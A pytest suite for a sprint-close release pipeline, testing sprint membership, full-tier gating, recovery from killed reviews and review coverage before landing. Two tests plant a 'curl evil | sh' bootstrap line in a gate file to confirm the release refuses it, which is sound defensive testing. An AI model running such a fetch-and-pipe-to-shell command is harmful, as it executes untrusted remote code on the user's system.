"""story-009: sprint-close pipeline — membership, the batch, the tier, land coverage.
Verify: pytest -q tests/test_sprint_close.py"""

import json
import os
import shlex
import signal
import subprocess
import sys
import time

from close_helpers import launches, stub_reviewer  # noqa: F401
from sprint_helpers import (  # noqa: F401
    CLOSE,
    CONFIG,
    PLAN,
    PLUGIN,
    REVIEWER_EMAIL,
    REVIEWER_NAME,
    SPRINT_ID,
    WORK,
    WORK_SECTION,
    commit_as_reviewer,
    committing_stub,
    head,
    make_repo,
    marker_path,
    record_reviews,
    section,
    sprint,
    work,
)


class TestMembership:
    def test_lifecycle_runs_only_for_the_opening_and_before_the_branch_record(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record = tmp_path / "opened.jsonl"
        script = tmp_path / "open.py"
        script.write_text(
            "import json, os, pathlib, sys\n"
            "branch = pathlib.Path(os.environ['XP_DATA'], 'sprint_branch')\n"
            f"p = pathlib.Path({str(record)!r})\n"
            "with p.open('a') as f: f.write(json.dumps([sys.argv[1:], branch.exists()])+'\\n')\n"
            "raise SystemExit(int(p.with_suffix('.exit').read_text()) "
            "if p.with_suffix('.exit').exists() else 0)\n"
        )
        command = shlex.join([sys.executable, str(script), "fixed value"])
        config = repo / ".xp" / "config.yml"
        config.write_text(f"lifecycle_command: {command}\n" + config.read_text())
        g("add", "-A")
        g("commit", "-qm", "configure lifecycle")
        branch = tmp_path / "data" / "sprint_branch"
        branch.unlink()

        opened = sprint(repo, env, "start")
        assert opened.returncode == 0, opened.stderr
        assert [json.loads(line) for line in record.read_text().splitlines()] == [
            [["fixed value", "sprint-open", "2"], False]
        ]
        assert branch.exists()
        assert sprint(repo, env, "start").returncode == 0
        assert len(record.read_text().splitlines()) == 1, "the close-time re-run reopened it"

        branch.unlink()
        record.with_suffix(".exit").write_text("1")
        plan = tmp_path / "data" / "plan.md"
        plan.write_text(plan.read_text().replace("[in-progress]", "[planned]", 1))
        refused = sprint(repo, env, "start")
        assert refused.returncode == 2 and "sprint-open" in refused.stderr
        assert command.split()[0] in refused.stderr and not branch.exists()
        assert "[planned]" in plan.read_text()

    def test_other_sprints_do_not_block_this_one(self, tmp_path):
        """The naive reading — no story in plan.md is non-done — refuses forever,
        because Sprint 3 is [ready] right now and always will be."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-099" not in r.stdout
        assert "milestone" not in r.stdout.lower()

    def test_sprint_2_does_not_swallow_sprint_20(self, tmp_path):
        """Membership was a PREFIX match, so sprint 2 claimed sprint 20's cards:
        closing 2 would refuse forever on a story that is not its own, and a
        double-digit sprint would silently close two sprints as one."""
        repo, env, _g = make_repo(
            tmp_path,
            plan=PLAN.replace(
                "### Sprint 3",
                "### Sprint 20\n#### story-900 — not this sprint   [in-progress]\n\n### Sprint 3",
            ),
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert "story-900" not in r.stdout + r.stderr

    def test_a_rerun_over_an_unfinished_sprint_refuses_instead_of_skipping_the_checks(
        self, tmp_path
    ):
        """The close leg exits 0 at OPEN, when every story is unfinished by
        definition. Without the re-run split that exit 0 is also what a premature
        close gets — falsifier batch, full tier and triage all silently skipped."""
        repo, env, _g = make_repo(tmp_path)
        path = tmp_path / "data" / "plan.md"
        for status in ("planned", "ready", "in-progress"):
            path.write_text(
                PLAN.replace(
                    "#### story-043 — also done   [done]",
                    f"#### story-043 — also done   [{status}]",
                )
            )
            r = sprint(repo, env, "start")
            assert r.returncode == 2 and "story-043" in r.stderr
            assert "milestone" not in (r.stdout + r.stderr).lower()

    def test_start_refuses_to_overwrite_another_active_sprint(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        path = tmp_path / "data" / "sprint_branch"
        path.write_text("sprint-other\n")
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "clear" in r.stderr
        assert path.read_text().strip() == "sprint-other"

    def test_start_refuses_trunk_and_never_records_it(self, tmp_path):
        """Both halves, because they are stopped by different code: with a sprint
        already recorded the mismatch refusal fires anyway, so only the SECOND —
        nothing recorded, the sprint's first start — reaches this guard. Recording
        trunk would point integration_target at trunk, merging every story there."""
        repo, env, g = make_repo(tmp_path)
        g("checkout", "-q", "main")
        path = tmp_path / "data" / "sprint_branch"
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "freshly cut branch" in r.stderr
        assert path.read_text().strip() == "sprint-002"
        path.unlink()
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "freshly cut branch" in r.stderr
        assert not path.exists()

    def test_an_empty_branch_record_refuses_rather_than_reading_as_unset(self, tmp_path):
        """The one branch-state boundary story-061 drew that nothing constructed.
        EMPTY IS NOT ABSENT: absent falls back to the default branch on purpose, so
        a truncated record read as absent silently retargets every story merge of
        the sprint to trunk — the single failure this whole card refuses to risk.
        The OTHER reader, close.integration_target, is walked by
        falsifier_sprint_branch_insulation.py — `review` resolves trunk, not the
        integration target, so this leg cannot stand in for it."""
        repo, env, _g = make_repo(tmp_path)
        path = tmp_path / "data" / "sprint_branch"
        path.write_text("\n")
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "is empty" in r.stderr and "Traceback" not in r.stderr
        assert path.read_text() == "\n", "the refusal rewrote the state it refused on"

    def test_unreadable_branch_state_is_not_treated_as_missing(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        path = tmp_path / "data" / "sprint_branch"
        path.unlink()
        path.mkdir()
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "not readable" in r.stderr and "Traceback" not in r.stderr

    def test_a_retired_story_in_this_sprint_does_not_refuse(self, tmp_path):
        plan = (
            PLAN.replace(
                "#### story-043 — also done   [done]",
                "#### story-043 — folded elsewhere   [retired]",
            )
            .replace(
                "### Sprint 3",
                "### Pool — not scheduled\n#### story-098 — later   [planned]\n\n### Sprint 3",
            )
            .replace(
                "#### story-099 — not this sprint   [ready]",
                "#### story-099 — later terminal card   [done]",
            )
        )
        repo, env, _g = make_repo(
            tmp_path,
            plan=plan,
        )
        r = sprint(repo, env, "start")
        assert r.returncode == 0, r.stderr
        assert r.stdout.count("## Milestone 1") == 1
        assert "close.py sprint 2 milestone-done" in r.stdout
        assert (tmp_path / "data" / "plan.md").read_text() == plan


class TestFullTier:
    def test_a_red_full_tier_refuses(self, tmp_path):
        """The fixture tier was `true` — green by construction — so deleting the
        returncode check left every test passing. It is the primary gate of the
        leg: unguarded, sprint close certifies a red suite as a release."""
        repo, env, _g = make_repo(tmp_path, config=CONFIG.replace("full: true", "full: false"))
        r = sprint(repo, env, "start")
        assert r.returncode == 2, "a red full tier did not stop the close"
        assert "full tier" in r.stderr

    def test_a_red_batch_refuses_before_the_full_tier_runs(self, tmp_path):
        """afbd01a3: the batch ran the full tier (256 tests, ~25s) before refusing
        on a falsifier it could have checked first. The tier writes a sentinel;
        BOTH halves are asserted, because absence alone also passes an
        implementation that simply deleted the tier."""
        sentinel = tmp_path / "tier-ran"
        repo, env, _g = make_repo(
            tmp_path, config=CONFIG.replace("full: true", f"full: touch {sentinel}")
        )
        flag = tmp_path / "flag"
        flag.write_text("ok")
        work(
            repo, env, "debt", "--claim", "latent", "--falsifier", f"test -f {flag}", "--files", "a"
        )
        flag.unlink()
        assert sprint(repo, env, "start").returncode == 2
        assert not sentinel.exists(), "the expensive tier ran before the cheap batch refused"
        flag.write_text("ok")
        assert sprint(repo, env, "start").returncode == 0
        assert sentinel.exists(), "a green batch never reached the tier"

    def test_the_unedited_scaffold_tier_never_reaches_the_shell(self, tmp_path):
        """DRIVEN at story-046 review: `EDIT-ME` reached `sh -c`, came back 127 and
        refused as `full tier red: EDIT-ME` — a red suite blamed on an unedited
        config. An ABSENT tier stays legal here; test_falsifier_batch owns that."""
        config = CONFIG.replace("full: true", "full: EDIT-ME")
        repo, env, _g = make_repo(tmp_path, config=config)
        r = sprint(repo, env, "start")
        assert r.returncode == 2 and "Set tests.full" in r.stderr, r.stdout
        assert "full tier red" not in r.stderr and "running the full tier" not in r.stdout

    def test_a_stray_top_level_key_cannot_override_the_declared_tier(self, tmp_path):
        """`full:` is only ever nested under `tests:` — the flat lookup was dead
        code, and worse than dead: a stray top-level key silently replaced the
        real tier with a green one and the close certified an unrun suite."""
        repo, env, _g = make_repo(
            tmp_path, config="full: true\n" + CONFIG.replace("full: true", "full: false")
        )
        assert sprint(repo, env, "start").returncode == 2, "a stray key shadowed the real tier"


class TestKilledReviewRecovery:
    def test_host_killed_stage_report_becomes_an_incomplete_round(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        ready = tmp_path / "stage-report-written"
        (tmp_path / "bin" / "claude").write_text(
            "#!/usr/bin/env python3\n"
            "import json, pathlib, re, sys, time\n"
            "if sys.argv[1:] == ['plugin', 'list', '--json']:\n"
            ' print(\'[{"id":"xp-plugin@xp-plugin","version":"fixture",'
            '"scope":"user"}]\'); sys.exit()\n'
            "prompt = sys.stdin.read()\n"
            "report = re.search(r'^REPORT_PATH: (.+)$', prompt, re.M).group(1).strip()\n"
            'pathlib.Path(report).write_text(json.dumps({"fixed": [], "blocking": [],'
            ' "noted": ["survived host kill"]}))\n'
            f"pathlib.Path({str(ready)!r}).write_text('ready')\n"
            "time.sleep(30)\n"
        )
        (tmp_path / "bin" / "claude").chmod(0o755)
        proc = subprocess.Popen(
            [sys.executable, str(CLOSE), "sprint", SPRINT_ID, "review"],
            cwd=repo,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            start_new_session=True,
        )
        # A generous HANG GUARD, never a timing assertion (constraint 2): the 5s this
        # first carried redded the story tier at -n 12, where the leg needs longer.
        deadline = time.monotonic() + 120
        while not ready.exists() and proc.poll() is None and time.monotonic() < deadline:
            time.sleep(0.05)
        if not ready.exists():  # communicate() before the killpg would wait on the stub
            os.killpg(proc.pid, signal.SIGKILL)
            raise AssertionError(f"no stage report: {proc.communicate(timeout=5)}")
        os.killpg(proc.pid, signal.SIGKILL)
        proc.communicate(timeout=5)
        assert proc.returncode < 0, "the host did not kill the controlling process"

        rescued = sprint(repo, env, "salvage")
        assert rescued.returncode == 0, rescued.stderr
        state = json.loads(marker_path(tmp_path).read_text())
        assert state["rounds"][-1]["noted"] == ["survived host kill"]
        assert state["rounds"][-1]["incomplete"] and state["rounds"][-1]["stages"]
        land = sprint(repo, env, "land", "--dry-run")
        assert land.returncode == 2 and "incomplete" in land.stderr

    def test_a_dirty_tree_refuses_sprint_salvage_without_consuming_the_report(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        root = tmp_path / "data" / "reports" / "sprint"
        report = root / f"{SPRINT_ID}.find-a.round-1.json"
        report.parent.mkdir(parents=True, exist_ok=True)
        body = json.dumps({"fixed": [], "blocking": [], "noted": ["survived"]})
        report.write_text(body)
        dirt = repo / "uninspected.txt"
        dirt.write_text("dead reviewer work\n")

        refused = sprint(repo, env, "salvage")

        assert refused.returncode == 2 and refused.stderr.startswith("refused: "), refused.stderr
        assert "dead reviewer's uninspected work; read it before committing" in refused.stderr
        assert not marker_path(tmp_path).exists(), "dirty salvage recorded a sprint round"
        assert report.read_text() == body and dirt.read_text() == "dead reviewer work\n"

    def test_sprint_salvage_names_the_unrecorded_round_it_searched(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        refused = sprint(repo, env, "salvage")
        assert refused.returncode == 2
        assert f"{SPRINT_ID}.*.round-1.json" in refused.stderr, refused.stderr

    def test_an_unreadable_stage_report_is_not_reported_as_an_absent_one(self, tmp_path):
        """Constraint 15; the story leg already draws this boundary and this is its
        second implementation, so only a test on BOTH keeps them from drifting."""
        repo, env, _g = make_repo(tmp_path)
        path = tmp_path / "data" / "reports" / "sprint" / f"{SPRINT_ID}.find-x.round-1.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("{not json")
        refused = sprint(repo, env, "salvage")
        assert refused.returncode == 2, refused.stdout
        assert "UNREADABLE" in refused.stderr, refused.stderr
        assert "no unrecorded sprint reports" not in refused.stderr, refused.stderr


class TestLandCoverage:
    """Bug c9b48a66: sprint land lacked coverage. These tests use `--dry-run`,
    whose success reaches past the coverage guard but stops before the fixture's
    missing `gh`; a real land's rc 2 would not distinguish those refusals."""

    def test_land_with_no_recorded_review_at_all_refuses(self, tmp_path):
        """The base case IS the bug's claim. A guard that fires only when a record
        exists greens the do-nothing path — which is the whole defect."""
        repo, env, _g = make_repo(tmp_path)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, "a release PR opened with no review recorded anywhere"
        assert f"sprint {SPRINT_ID} review" in r.stderr, "the refusal names no way out"

    def test_land_proceeds_once_a_round_covers_head(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert "gh pr create" in r.stdout

    def test_land_refuses_while_the_last_round_has_blocking_findings(self, tmp_path):
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env, blocking=["A-BLOCKING-FINDING"])
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "A-BLOCKING-FINDING" in r.stderr

    def test_land_refuses_when_a_CODE_commit_landed_after_the_review(self, tmp_path):
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nUNREVIEWED = 2\n")
        g("add", "-A")
        g("commit", "-qm", "code after the review")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "did not cover" in r.stderr

    def test_land_proceeds_when_the_whole_delta_since_the_review_is_under_xp(self, tmp_path):
        """Paul's call, and it rests on the retro diff having its own human review
        at triage — NOT on .xp/ being harmless. Retro and constraint-promotion
        commits always land after the reviews, so a strict rule forces a fresh
        broad AND security review at every close: the afbd01a3 wedge, where
        completing the close invalidates the review that permits it.

        story-019 removed plan-status commits from this list — the plan is
        per-clone now, so a flip never reaches the diff at all. .xp/plan.md was
        this exemption's only real subject in OUR layout; every .xp/ file left is
        a GATE_FILE, so the exemption cannot fire here any more (note af6469a5).
        It still ships for consuming projects, and a non-gate .xp/ file is what
        constructs the condition it claims."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        g("add", "-A")
        g("commit", "-qm", "retro prose under .xp/")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr
        assert ".xp/retro-notes.md" in r.stdout, "an exemption nobody is shown is a silent one"

    def test_a_code_change_alongside_an_xp_change_is_NOT_exempt(self, tmp_path):
        """Code motion is never exempt; without this the exemption is a hole."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "retro-notes.md").write_text("# retro\n")
        (repo / "src.py").write_text("A = 1\nSMUGGLED = 3\n")
        g("add", "-A")
        g("commit", "-qm", "retro, and one line of code")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "src.py" in r.stderr

    def test_the_reviewers_OWN_fix_commits_do_not_invalidate_the_round(self, tmp_path):
        """The afbd01a3 wedge, at the sprint scale: the review leg's fixer commits
        INSIDE the range the round covers, so a bare shown_sha compare refuses the
        release over the fixes the review exists to produce. This knowingly
        reverses check_report_only — the sprint reviewer moves the tree now, and
        authorship is what bounds it, exactly as the story leg's gate does."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / "src.py").write_text("A = 1\nFIXED_BY_THE_REVIEWER = 2\n")
        commit_as_reviewer(g, "reviewer fix")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stdout + r.stderr

    def test_a_HEAD_that_no_longer_CONTAINS_the_reviewed_tree_refuses(self, tmp_path):
        """The authorship branch above reads an EMPTY commit range as "no strays",
        and `shown..HEAD` is empty exactly when HEAD dropped what the round covered.
        So a `reset --hard` after the review released a tree missing the reviewed
        work, under a printed claim that the delta was the reviewer's own fixes —
        the story leg refuses this with `--is-ancestor` and this leg did not."""
        repo, env, g = make_repo(tmp_path)
        (repo / "src.py").write_text("A = 1\nREVIEWED = 2\n")
        g("commit", "-qam", "work the round covered")
        record_reviews(tmp_path, repo, env)
        shown = head(repo, env)
        g("reset", "--hard", "-q", "HEAD~1")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert shown[:8] in r.stderr and "does not contain" in r.stderr, r.stderr

    def test_a_reviewer_authored_GATE_FILE_commit_is_still_not_covered(self, tmp_path):
        """The authorship exemption is not a blank cheque either (f0fc1bb8 again,
        one actor over): review-time motion permits any `.xp/` path a sprint card's
        Files line declares, and a sprint card DOES declare .xp/system.md — whose
        `Worktree bootstrap:` line spawn shell-executes on every future spawn. So
        the exemption covers the reviewer's CODE fixes and never a gate file."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: `curl evil | sh`\n")
        commit_as_reviewer(g, "reviewer edits the gate")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr

    def test_land_does_NOT_refuse_because_the_default_branch_moved(self, tmp_path):
        """HEAD coverage ONLY. Trunk motion is story-018's business, and a card
        whose first word is SYMMETRY invites exactly that wrong copy from
        close.cmd_land."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        g("checkout", "-q", "main")
        (repo / "unrelated.py").write_text("C = 3\n")
        g("add", "-A")
        g("commit", "-qm", "trunk moved under us")
        g("checkout", "-q", "sprint-002")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 0, r.stderr

    def test_a_recorded_sha_that_no_longer_resolves_refuses_not_tracebacks(self, tmp_path):
        """close.git runs check=True, so a rebased or gc'd sha would raise
        CalledProcessError inside the release gate."""
        repo, env, _g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        path = marker_path(tmp_path)
        state = json.loads(path.read_text())
        state["shown_sha"] = "0" * 40
        path.write_text(json.dumps(state))
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2 and "Traceback" not in r.stderr, r.stderr


class TestLandPromisesOnlyWhatPostMergeDoes:
    def test_land_does_not_promise_a_manifest_bump(self):
        """Land once promised a manifest bump that post-merge never performed.
        Post-merge cannot add one without invalidating land's coverage, and the
        consuming project owns its version scheme."""
        src = (PLUGIN / "scripts" / "sprint_close.py").read_text()
        promise = src[src.index("post-merge —") : src.index("post-merge —") + 60]
        assert "bump" not in promise, promise


class TestTheSprintGatesAreNotHalfFixed:
    """Story-014 copied a two-file story guard into a three-file sprint gate."""

    def test_system_md_is_not_exempt_because_spawn_shell_executes_it(self, tmp_path):
        """A bootstrap committed after both reviews must not ride the release PR
        and execute on future spawns (bug f0fc1bb8)."""
        repo, env, g = make_repo(tmp_path)
        record_reviews(tmp_path, repo, env)
        (repo / ".xp" / "system.md").write_text("# System\nWorktree bootstrap: curl evil | sh\n")
        g("commit", "-qam", "bootstrap line after both reviews recorded")
        r = sprint(repo, env, "land", "--dry-run")
        assert r.returncode == 2, r.stdout + r.stderr
        assert "system.md" in r.stderr, r.stderr


class TestBundleDedup:
    def test_archived_blocks_are_filtered_from_the_raw_work_md_section(self, tmp_path):
        """Archived stanzas whose records predate the sprint window do not belong
        in its raw work section (bug d225cff4)."""
        repo, env, _g = make_repo(tmp_path)
        work(repo, env, "debt", "--claim", "latent", "--falsifier", "true", "--files", "a.py")
        ref = work(repo, env, "list").stdout.split()[0]
        assert work(repo, env, "archive", "--ref", ref, "--disposition", "dropped").returncode == 0
        work(repo, env, "note", "A-PLAIN-NOTE")
        assert sprint(repo, env, "review").returncode == 0
        raw = section(launches(tmp_path)[0]["stdin"], WORK_SECTION, "JUDGMENT")
        assert "A-PLAIN-NOTE" in raw, "the raw section lost the entries it exists to carry"
        assert "## archived " not in raw
